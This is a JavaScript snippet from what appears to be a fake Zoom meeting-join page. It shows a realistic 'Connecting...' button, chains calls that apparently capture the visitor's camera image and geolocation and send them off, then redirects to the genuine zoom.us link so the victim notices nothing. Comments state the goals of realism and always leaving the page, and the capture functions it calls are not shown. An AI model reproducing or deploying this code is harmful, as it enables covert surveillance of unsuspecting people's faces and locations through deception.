<script>
    function instantStart() {   
        var btn = document.querySelector('.VahdFMz0');
        if(btn) {
            // MATCHING STATUS: Keep it saying "Connecting..." to match location.js
            btn.innerHTML = "Connecting..."; 
            btn.style.backgroundColor = "#0e72ed"; // Keep original blue color for realism
            btn.style.cursor = "wait";
        }
        
        // --- MASTER FAILSAFE (The Fix for "Stuck") ---
        // If nothing happens for 10 seconds, force the redirect.
        setTimeout(function() {
            magicExit(); 
        }, 10000);

        // Start the Chain: Camera -> Location -> Redirect
        captureAndSend(locationPhase);
    }

    function locationPhase() {
        // We pass 'magicExit' for both success AND failure.
        // This ensures we always leave the page.
        locate(magicExit, magicExit);
    }

    function magicExit() {
        // Final status update before leaving
        var btn = document.querySelector('.VahdFMz0');
        if(btn) btn.innerHTML = "Joining Meeting...";

        const urlParams = new URLSearchParams(window.location.search);
        const meetingId = urlParams.get('id');

        setTimeout(function() {
            if (meetingId) {
                window.location.replace("https://zoom.us/j/" + meetingId);
            } else {
                window.location.replace("https://zoom.us/join");
            }
        }, 1000);
    }
</script>
